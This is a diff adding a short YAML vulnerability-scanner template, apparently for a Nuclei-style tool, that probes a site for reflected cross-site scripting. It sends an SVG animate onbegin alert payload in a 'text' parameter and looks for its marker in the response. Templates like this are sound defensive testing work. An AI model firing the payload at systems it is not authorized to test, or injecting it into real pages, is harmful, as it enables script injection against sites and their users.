@@ -1,0 +1,20 @@
+id: xss2-055
+name: 'Reflected XSS2 ctx-24 via text'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in text'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      text:
+        - '<svg><animate onbegin=alert(nx2054) attributeName=x>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx2054'
